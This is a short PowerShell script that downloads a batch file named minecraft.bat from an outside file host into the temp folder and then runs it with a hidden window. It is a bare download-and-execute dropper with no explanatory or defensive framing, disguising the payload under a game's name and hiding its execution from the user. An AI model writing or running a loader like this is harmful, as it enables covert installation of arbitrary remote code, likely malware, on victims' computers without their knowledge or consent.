$fileUrl = "https://filehost.fun/minecraft.bat"
$destinationPath = "$env:TEMP\minecraft.bat"

# Download the file to temp folder
Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath -UseBasicParsing

# Automatically run it hidden
Start-Process -FilePath $destinationPath -WindowStyle Hidden